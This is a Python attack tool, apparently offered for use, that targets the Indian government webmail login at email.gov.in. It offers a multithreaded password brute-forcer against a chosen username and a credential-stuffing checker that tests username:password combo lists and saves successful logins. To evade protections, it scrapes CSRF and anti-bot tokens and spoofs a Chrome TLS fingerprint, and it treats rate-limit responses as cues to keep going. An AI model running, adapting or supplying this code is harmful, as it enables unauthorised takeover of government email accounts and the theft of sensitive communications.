import time, os
import threading, queue

from bs4 import BeautifulSoup
from colorama import Fore
from tls_client import Session

####################################

session = Session(
    client_identifier="chrome_113",
    random_tls_extension_order=True
)

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
cyan = Fore.CYAN

####################################

class Brute_Data:
    def __init__(self, cracked, fails, retries):
        self.cracked = cracked
        self.fails = fails
        self.retries = retries

        self.cracked = False
class Checker_Data:
    def __init__(self, hits, fails, retries):
        self.hits = hits
        self.fails = fails
        self.retries = retries

bd = Brute_Data(False, 0, 0)
cd = Checker_Data(0, 0, 0)

class Modules:
    def __init__(self):
        pass

    # Brute

    def get_csrf_1(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        csrf_token = soup.find('input', {'name': 'login_csrf'})['value']
        return csrf_token
    
    def as_sfid(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        tk = soup.find('input', {'name': 'as_sfid'})['value']
        return tk

    def as_fid(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        tk = soup.find('input', {'name': 'as_fid'})['value']
        return tk

    def brute(self):
        os.system("cls")
        username = input(cyan + "Username: ")
        threads = input(cyan + "Threads: ")

        with open("passwords.txt", "r", encoding="utf-8") as f:
            passwords = f.readlines()
        q = queue.Queue()
        for i in passwords:
            p = i.strip()
            q.put(p)

        os.system("cls")
        input(cyan + f"Target: {username} |Threads: {threads} | Passwords: {len(passwords)} | Press Enter To Start > ")
        print()

        def login(q):
            while not q.empty():
                password = q.get()
                csrf = self.get_csrf_1()
                fid = self.as_fid()
                sfid = self.as_sfid()

                u = "https://email.gov.in/"
                d = f"loginOp=login&login_csrf={csrf}&username={username}&password={password}&language=English&client=preferred&as_sfid={sfid}&as_fid={fid}"
                
                r = session.post(u, data=d)
                if "Email Web Client Sign In" in r.text:
                    bd.fails += 1
                    print(red + f"[-] {password}")
                elif r.status_code == 429:
                    bd.retries += 1
                    print(yellow + f"[!] {password}")
                elif r.status_code == 403:
                    bd.retries += 1
                    print(yellow + f"[!] {password}")
                else:
                    with open("cracked.txt", "w") as f:
                        f.write(f"Username: {username} | [+] Cracked Password -> {password}\nPasswords Tried: {bd.fails} | Rate Limited: {bd.retries}")
                    os.startfile("cracked.txt")
                    exit()

        num_threads = int(threads)
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    # Checker

    def get_csrf(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        csrf_token = soup.find('input', {'name': 'login_csrf'})['value']
        return csrf_token
    
    def as_sfid(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        tk = soup.find('input', {'name': 'as_sfid'})['value']
        return tk

    def as_fid(self):
        r = session.get("https://email.gov.in/")
        soup = BeautifulSoup(r.content, 'html.parser')
        tk = soup.find('input', {'name': 'as_fid'})['value']
        return tk


    def checker(self):
        os.system("cls")
        threads = input(cyan + "Threads: ")

        with open("combo.txt", "r", encoding="utf-8") as f:
            accs = f.readlines()
        q = queue.Queue()
        for i in accs:
            p = i.strip()
            acc = p.split(":")
            q.put(acc)
            os.system("cls")

        input(cyan + f"Threads: {threads} | Accounts: {len(accs)} | Press Enter To Start > ")
        print()

        def login(q):
            while not q.empty():
                try:
                    combo = q.get()
                    username, password = combo
                except:
                    pass
                csrf = self.get_csrf()
                fid = self.as_fid()
                sfid = self.as_sfid()

                acc = f"{username}:{password}"

                u = "https://email.gov.in/"
                d = f"loginOp=login&login_csrf={csrf}&username={username}&password={password}&language=English&client=preferred&as_sfid={sfid}&as_fid={fid}"
                
                r = session.post(u, data=d)
                if "Email Web Client Sign In" in r.text:
                    cd.fails += 1
                    print(red + f"[-] {acc}")
                elif r.status_code == 429:
                    cd.retries += 1
                    print(yellow + f"[!] {acc}")
                elif r.status_code == 403:
                    cd.retries += 1
                    print(yellow + f"[!] {acc}")
                else:
                    with open("hits.txt", "a") as f:
                        f.write(f"Username: {username} | Password | {password}")
                    print(green + f"[+] Hit | {acc}")


        num_threads = int(threads)
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

####################################

modu = Modules()

def main():
    os.system("cls")
    print(cyan + r"""
 ____  _  _  ___  _____  _  _  ____  _  _ 
(_  _)( \( )/ __)(  _  )( \/ )(  _ \( \/ ) Dev -> [ISellStuff]
 _)(_  )  (( (_-. )(_)(  \  /  )___/ \  /  Exit -> [x]
(____)(_)\_)\___/(_____)  \/()(__)   (__) 
          
    [1] Mail Checker
    [2] BruteForce  """)

    options = ["1","2","x"]
    op = input(cyan + '''\n ┌[ ingov.py ]-[~]
 ┕╸╸$ ''')
    
    if op in options:
        if op == "x":
            print(yellow + "\n[*] Closing")
            time.sleep(1.5)
            exit()
    else:
        print(red + "\n[!] Invalid Option")
        time.sleep(1.5)
        main()

    if op == "1":
        modu.checker()
        input(cyan + f"\n[+] Stopped Checking | Hits: {cd.hits} | Fails: {cd.fails} | Retries: {cd.retries} | Hits Are In cracked.txt if you got any | Press Enter To Close > ")
    else:
        modu.brute()
        input(red + f"\n[!] Failed To Crack Password | Passwords Tried: {bd.fails} | Rate Limited: {bd.retries} |Press Enter To Close > ")
    

if __name__ == "__main__":
    main()
